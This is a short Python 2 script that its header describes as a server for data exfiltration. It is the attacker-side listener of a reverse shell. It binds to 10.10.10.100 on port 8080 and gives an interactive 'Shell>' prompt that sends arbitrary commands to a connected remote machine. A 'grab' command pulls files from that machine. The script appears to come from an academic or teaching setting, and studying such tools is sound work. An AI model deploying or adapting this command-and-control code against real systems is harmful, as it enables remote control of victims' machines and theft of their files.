#!/usr/bin/pythonw

#==========================================================
#title          :server.py
#description    :server program for data exfiltration
#author:        :s.vidalis@herts.ac.uk
#timestamp      :201511202334Z
#version        :0.0.1
#usage          :python server.py
#notes		:listens at 10.10.10.100. placeholder is
		 test.png. once connection is established 
		 use grab*<file path>
#==========================================================

import socket
import os

def transfer(conn, command):
	conn.send(command)
	f = open('/root/desktop/test.png','wb')
	while True:
		bits = conn.recv(1024)
		if 'Unable to find the file' in bits:
			print('[-] Unable to find the file')
			break
		if bits.endswith('DONE'):
			print('[+] Transfer completed')
			f.close()
			break
		f.write(bits)
	f.close()

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("10.10.10.100", 8080))
	s.listen(1)
	print('[+] Listening for incoming connection on port 8080')
	conn, addr = s.accept()
	print('[+] We got a connection from: ', addr)

	while True:
		command = raw_input("Shell> ")
		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break
		elif 'grab' in command:
			transfer(conn,command)
		else:
			conn.send(command)
			print conn.recv(1024)

def main():
	connect()

main()
